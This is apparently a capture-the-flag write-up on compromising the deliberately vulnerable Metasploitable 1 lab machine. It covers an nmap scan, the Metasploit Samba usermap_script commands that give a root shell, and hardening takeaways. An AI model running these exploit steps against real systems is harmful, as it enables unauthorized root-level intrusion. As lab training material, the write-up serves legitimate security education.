# 🔐 Metasploitable 1 CTF Writeup

## 📌 Target Information
- Target IP: <target-ip>  
- Platform: Metasploitable 1  

---

## 🔍 Enumeration

### Network Scan

nmap -sC -sV -A <target-ip>

### Results:

- 21/tcp → FTP  
- 22/tcp → SSH  
- 23/tcp → Telnet  
- 25/tcp → SMTP  
- 53/tcp → DNS  
- 80/tcp → HTTP  
- 111/tcp → RPCBind  
- 139/tcp → SMB  
- 445/tcp → SMB  
- 3306/tcp → MySQL  
- 8180/tcp → Tomcat  

### Analysis:
- Multiple services are exposed, significantly increasing the attack surface  
- Presence of legacy services such as Telnet and FTP indicates potential security weaknesses  
- SMB service appears to be the most promising entry point  

---

## 🔎 Service Enumeration

### Findings:
- SMB service is running an outdated version of Samba  
- This version is vulnerable to remote code execution  
- Other services (FTP, Telnet, MySQL, Tomcat) are exposed but were not exploited during this assessment  

---

## 💥 Exploitation

### Target:
Outdated Samba Service (Remote Code Execution)

### Exploit:

use exploit/multi/samba/usermap_script  
set RHOST <target-ip>  
run  

### Result:
- Shell access successfully obtained  
- Access level: root  

---

## 🔐 Privilege Escalation

### Check:

whoami  

### Output:
root  

### Result:
- Root access achieved directly from exploitation  
- No further privilege escalation required  

---

## 📂 Post Exploitation

### Findings:
- Full administrative control over the system  
- Access to sensitive system files  
- Ability to modify configurations  
- Potential to establish persistence  

---

## ⚠️ Key Observations

- Multiple services such as FTP, Telnet, MySQL, and Tomcat are exposed  
- These services increase the attack surface and may introduce additional vulnerabilities  
- Even though they were not exploited, they represent potential security risks  

---

## 🧠 Key Takeaways

- Outdated services can lead to critical vulnerabilities such as remote code execution  
- Excessive exposed services increase overall system risk  
- Legacy protocols like Telnet and FTP are insecure  
- Proper system hardening and service management are essential  
- Regular patching is necessary to prevent exploitation  

---

## 🏁 Final Result

- Initial Access: ✅ Achieved  
- Root Access: ✅ Achieved  
- Privilege Escalation: ❌ Not Required  
- System Compromise: ✅ Full  